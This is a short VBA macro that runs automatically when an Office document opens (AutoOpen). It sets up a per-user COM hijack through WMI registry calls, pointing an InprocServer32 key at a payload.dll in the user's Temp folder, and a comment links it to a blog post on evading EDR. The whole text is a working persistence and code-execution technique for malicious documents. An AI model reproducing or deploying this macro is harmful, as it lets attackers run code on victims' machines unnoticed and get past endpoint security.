Sub AutoOpen()

' First drop a payload.dll onto C:\Users\username\AppData\Local\Temp

' Afterwards loading via COM Hijack
' https://blog.f-secure.com/dechaining-macros-and-evading-edr/
Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
CLSID = "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
objRegistry.CreateKey &H80000001, "Software\Classes\CLSID\" & CLSID & "\InprocServer32"
objRegistry.SetStringValue &H80000001, "Software\Classes\CLSID\" & CLSID & "\InprocServer32", "", Environ("TEMP") & "\payload.dll"
objRegistry.SetStringValue &H80000001, "Software\Classes\CLSID\" & CLSID & "\InprocServer32", "ThreadingModel", "Apartment"

End Sub

